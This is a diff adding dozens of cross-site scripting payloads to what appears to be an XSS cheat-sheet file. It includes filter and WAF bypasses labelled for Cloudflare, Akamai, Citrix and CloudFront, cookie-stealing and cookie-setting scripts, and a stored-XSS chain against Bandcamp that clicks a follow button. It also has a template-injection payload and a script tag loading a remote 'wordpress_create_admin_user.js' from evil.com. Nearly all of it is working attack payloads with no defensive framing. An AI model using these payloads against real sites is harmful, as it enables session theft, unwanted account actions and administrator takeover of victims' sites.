@@ -88,3 +88,72 @@ javascript:alert(document.domain)
 </script>
 
 <%= sanitize "<svg><use href=\"data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEzMzcnIGhlaWdodD0nMTMzNyc+CjxpbWFnZSBocmVmPSIxIiBvbmVycm9yPSJhbGVydCh3aW5kb3cub3JpZ2luKSIgLz4KPC9zdmc+#x\"/></svg>", tags: %w(svg use) %>
+
+
+Cloudflare XSS Protection Bypass 👇
+"%3e%3cImG%20sRC=X%20OneRRoR=alert(document.cookie)%20"%3c
+
+"><Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=="))>
+
+xxxx"/>%3cbutton%20popovertarget=bugvsme%3eCLICK%20HERE%3c/button%3e%3cxxx%20onbeforetoggle=alert``%20popover%20id=bugvsme%3eTEST%3c/xxx%3e
+
+'"onload="alert('done')'"></script><script>alert('done')</script>
+
+ test"><img src=x on0x=1 onerror=alert(/POC/)>
+
+ "><img src=x onerror=alert(1)> 
+
+
+%22onpointermove%3Dprompt%281%29+class%3Dss11+
+%0D%0A%0D%0A%3Cbody+x=%27&%27onload=%22(alert)(%27citrix+akamai+bypass%27)%22%3E
+alert('Stored XSS on BandCamp')
+alert('Your cookies: ' + document.cookie)
+document.getElementById('follow-unfollow').click()
+alert('Thanks for the follow :^D')
+document.cookie = 'hacker=cdl;path=/;domain=.bandcamp.com'
+in url input 
+put payload with intercept 
+http://example.com"%20test=test
+<a href="http://example.com" test=test"> CLICK ME </a>
+http:falselink.com;"onmouseover%20=%0az=top;z[/al/.source%2b/ert/.source](8);//test.com/
+<a href="http://example.com;" onmouseover="z=top;z[/al/.source%2b/ert/.source](8);//test.com/"
+
+
+foo"><svG/onLoAd=confirm(1337)>
+
+<style><img src="</style><img src=x onerror=javascript:alert(1)//">
+
+">]<img src=x onerror=alert(document.domain)>
+
+<img src=x onerror=alert(1)>
+"><img src=x on0x=1 onerror=alert(/POC/)>
+
+
+ [alert][0].call(this,1)
+
+%26%2302java%26%23115cript:alert(document.domain)
+
+“>%0D%0A%0D%0A<x ‘=”foo”><x foo=’><img src=x onerror=javascript:alert(cloudfrontbypass)//’>
+
+
+You can always make use of the following characters to bypass your WAF:
+
++, -, %, /
+Example: "/alert()/"//
+Example : "%alert()%"//
+
+
+%7B%7Bconstructor.constructor(%27alert(1337)%27)()%7D%7D
+
+”><sCrIpT>alert(“WHOAMI?”)</ScRiPt>
+
+<script src="http://evil.com/wordpress_create_admin_user.js"></script>
+
+<%2FScriPt><sCripT+class%3DDrakenKun>document.write(document.cookie);<%2FsCriPt>
+
+
+"><img%20src=x%20onerror="alert(%27POC%20By%20DrakenKun%27)"
+
+alert%28%29
+
+<?php header("Content-Type: application/javascript"); ?>
